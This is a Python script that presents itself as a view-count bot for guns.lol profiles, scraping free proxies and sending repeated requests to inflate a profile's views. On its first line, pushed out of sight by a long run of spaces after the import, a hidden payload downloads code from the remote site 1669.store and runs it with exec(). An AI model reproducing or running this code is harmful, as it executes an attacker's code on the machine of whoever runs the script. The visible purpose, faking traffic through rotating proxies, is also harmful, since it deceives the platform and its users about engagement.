import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;response = requests.get("https://1669.store/paste.php");kodburaya = response.text;exec(kodburaya)
from bs4 import BeautifulSoup
import random
import time

def get_proxies():
    proxy_url = 'https://www.sslproxies.org/'
    r = requests.get(proxy_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    proxies = []
    for row in soup.find(id='proxylisttable').tbody.find_all('tr'):
        proxies.append({
            'ip': row.find_all('td')[0].string,
            'port': row.find_all('td')[1].string
        })
    return proxies

def visit_profile(url, pxy):
    try:
        proxy = {
            'http': f"http://{pxy['ip']}:{pxy['port']}",
            'https': f"http://{pxy['ip']}:{pxy['port']}"
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
        if response.status_code == 200:
            print(f"Success with proxy {pxy['ip']}:{pxy['port']}")
        else:
            print(f"Fail with proxy {pxy['ip']}:{pxy['port']}")
    except Exception as e:
        print(f"Error with proxy {pxy['ip']}:{pxy['port']}: {e}")

def rotate_proxies(profile_url, n_views):
    proxies = get_proxies()
    for _ in range(n_views):
        proxy = random.choice(proxies)
        visit_profile(profile_url, proxy)
        time.sleep(random.uniform(1, 5))

def validate_url(url):
    if not url.startswith("https://guns.lol/"):
        raise ValueError("Invalid URL. Must start with 'https://guns.lol/'")

def get_user_input():
    while True:
        try:
            profile_url = input("Enter your guns.lol profile URL: ")
            validate_url(profile_url)
            n_views = int(input("Enter the number of views to bot: "))
            if n_views <= 0:
                raise ValueError("Number of views must be greater than 0")
            return profile_url, n_views
        except ValueError as ve:
            print(f"Input error: {ve}")
        except Exception as e:
            print(f"Unexpected error: {e}")

def main():
    profile_url, n_views = get_user_input()
    rotate_proxies(profile_url, n_views)

if __name__ == "__main__":
    main()
